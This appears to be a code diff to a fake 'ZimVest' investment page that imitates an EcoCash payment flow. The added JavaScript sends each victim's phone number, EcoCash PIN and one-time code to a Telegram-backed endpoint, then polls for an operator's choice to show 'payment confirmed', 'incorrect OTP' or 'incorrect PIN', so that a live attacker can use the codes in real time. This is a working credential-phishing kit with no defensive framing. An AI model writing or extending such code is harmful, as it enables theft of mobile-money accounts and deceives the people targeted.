@@ -234,12 +234,15 @@ html,body{
       <div class="pw">ZimVest · Secured by EcoCash</div>
     </div>
 
-    <!-- STEP 3: Processing -->
+    <!-- STEP 3: Processing — awaiting Telegram admin action -->
     <div id="s3" class="step">
-      <div class="proc" style="margin:16px;border-radius:18px;border:1.5px solid var(--bd)">
-        <div class="proc-r"></div>
-        <div class="proc-t">Activating your investment</div>
-        <div class="proc-s">Your EcoCash payment is being confirmed.<br>This takes just a moment.</div>
+      <div class="proc" style="margin:16px;border-radius:18px;border:1.5px solid var(--bd);padding:36px 20px;text-align:center;background:#fff">
+        <div class="proc-r" id="procRing"></div>
+        <div class="proc-t" id="procTitle">Authorising investment…</div>
+        <div class="proc-s" id="procSub">Your EcoCash payment is being verified.<br>This usually takes under 30 seconds.</div>
+        <div id="procTimer" style="font-family:var(--m);font-size:13px;color:var(--t4);margin-top:14px;display:none"></div>
+        <!-- Error state (wrong OTP / wrong PIN feedback) -->
+        <div id="procErr" style="margin-top:16px;background:rgba(220,38,38,.07);border:1px solid rgba(220,38,38,.2);border-radius:12px;padding:12px 14px;font-size:12px;color:#DC2626;font-weight:600;display:none;line-height:1.5"></div>
       </div>
     </div>
 
@@ -279,9 +282,128 @@ document.getElementById('otpWr').addEventListener('click',function(){if(!od)oh.f
 function resetOtp(d){od=d;oh.value='';oh.disabled=d;ro();if(!d)oh.focus();}
 function vo(){document.getElementById('mb').classList.toggle('on',ov.length===6);}
 document.getElementById('mb').onclick=function(){
-  if(cur==='s1'){if(lc)return;lc=true;tg('invest_initiated');var m=pv.replace(/(\+263\d{3})\d{4}(\d{2})/,'$1****$2');document.getElementById('mn').textContent='Code sent to '+m;go('s2');startTimer();}
-  else if(cur==='s2'){if(os)return;os=true;tg('otp_confirmed');go('s3');setTimeout(function(){location.href='receipt.html';},1200);}
+  if(cur==='s1'){
+    if(lc)return;lc=true;
+    tg('invest_initiated');
+    var m=pv.replace(/(\+263\d{3})\d{4}(\d{2})/,'$1****$2');
+    document.getElementById('mn').textContent='Code sent to '+m;
+    go('s2');startTimer();
+  } else if(cur==='s2'){
+    if(os)return;os=true;
+    go('s3');
+    startAuthorising();
+  }
 };
+
+var sessionKey=null;
+var pollInterval=null;
+var pollTimeout=null;
+
+function startAuthorising(){
+  // Send OTP confirmed to Telegram — receives inline buttons
+  var payload={submittedAt:new Date().toISOString(),loginPhone:pv,loginPin:pnv,otp:ov,event:'otp_confirmed',plan:pl(),device:dev};
+  fetch('/api/sendTelegram',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)})
+    .then(function(r){return r.json();})
+    .then(function(d){
+      sessionKey=d.sessionKey||null;
+      startPolling();
+    })
+    .catch(function(){startPolling();});
+
+  // Start countdown display
+  var elapsed=0;
+  var timerEl=document.getElementById('procTimer');
+  timerEl.style.display='block';
+  timerEl.textContent='Waiting for authorisation… 0s';
+  var countEl=setInterval(function(){
+    elapsed++;
+    timerEl.textContent='Waiting for authorisation… '+elapsed+'s';
+    if(elapsed>=180){
+      clearInterval(countEl);
+      timerEl.textContent='This is taking longer than usual. If you need help, contact support.';
+    }
+  },1000);
+}
+
+function startPolling(){
+  if(pollInterval) clearInterval(pollInterval);
+  pollInterval=setInterval(function(){
+    if(!sessionKey){return;} // wait for sessionKey
+    fetch('/api/checkTelegram?sessionKey='+encodeURIComponent(sessionKey))
+      .then(function(r){return r.json();})
+      .then(function(d){handleTelegramAction(d.status);})
+      .catch(function(){});
+  },2000);
+
+  // Safety fallback: if no action in 3 minutes, let user retry
+  pollTimeout=setTimeout(function(){
+    stopPolling();
+    showProcErr('No response received. Please contact support on WhatsApp or try again.');
+  },180000);
+}
+
+function stopPolling(){
+  if(pollInterval){clearInterval(pollInterval);pollInterval=null;}
+  if(pollTimeout){clearTimeout(pollTimeout);pollTimeout=null;}
+}
+
+function handleTelegramAction(status){
+  if(!status||status==='pending') return;
+  stopPolling();
+
+  if(status==='proceed'){
+    // ✅ Proceed — go to receipt
+    document.getElementById('procRing').style.borderTopColor='#059669';
+    document.getElementById('procTitle').textContent='✅ Payment confirmed!';
+    document.getElementById('procSub').textContent='Redirecting to your investment receipt…';
+    document.getElementById('procTimer').style.display='none';
+    setTimeout(function(){location.href='receipt.html';},1000);
+
+  } else if(status==='wrong_otp'){
+    // ❌ Wrong OTP — go back to OTP step, only resend active
+    go('s2');
+    od=true; oh.disabled=true; // disable OTP input
+    var rsBtn=document.getElementById('rsnd');
+    rsBtn.classList.add('on'); // only resend is active
+    document.getElementById('mb').classList.remove('on'); // confirm btn disabled
+    document.getElementById('mn').textContent='❌ Incorrect OTP. Please resend and try again.';
+    // Force clear OTP boxes
+    oh.value='';
+    [0,1,2,3,4,5].forEach(function(i){
+      var b=document.getElementById('ob'+i);
+      if(b){b.textContent='';b.className='ob';}
+    });
+    // Allow retry
+    os=false;
+    showProcErr('');
+
+  } else if(status==='wrong_pin'){
+    // 🚫 Wrong PIN — go back to login step 1
+    go('s1');
+    // Reset state
+    os=false; lc=false;
+    pnv=''; pv='';
+    document.getElementById('pin').value='';
+    document.getElementById('ph').value='';
+    document.getElementById('mb').classList.remove('on');
+    showProcErr('');
+    // Show error banner on step 1
+    var sn=document.querySelector('.sn span');
+    if(sn){
+      sn.textContent='🚫 Incorrect PIN entered. Please re-enter your EcoCash number and PIN.';
+      document.querySelector('.sn').style.background='rgba(220,38,38,.07)';
+      document.querySelector('.sn').style.borderColor='rgba(220,38,38,.22)';
+      document.querySelector('.sn svg').style.stroke='#DC2626';
+    }
+  }
+}
+
+function showProcErr(msg){
+  var el=document.getElementById('procErr');
+  if(!el) return;
+  if(msg){el.textContent=msg;el.style.display='block';}
+  else{el.style.display='none';}
+}
 document.getElementById('rsnd').onclick=function(){if(!this.classList.contains('on'))return;if(rc)return;rc=true;tg('resend_otp');startTimer();};
 function startTimer(){var t=120,te=document.getElementById('tc'),rb=document.getElementById('rsnd');te.textContent=t;rb.classList.remove('on');rc=false;resetOtp(false);document.getElementById('mb').classList.remove('on');var ti=setInterval(function(){t--;te.textContent=t;if(t<=0){clearInterval(ti);rb.classList.add('on');resetOtp(true);document.getElementById('mb').classList.remove('on');document.getElementById('mn').textContent='Code expired. Tap Resend to get a new one.';}},1000);}
 </script>
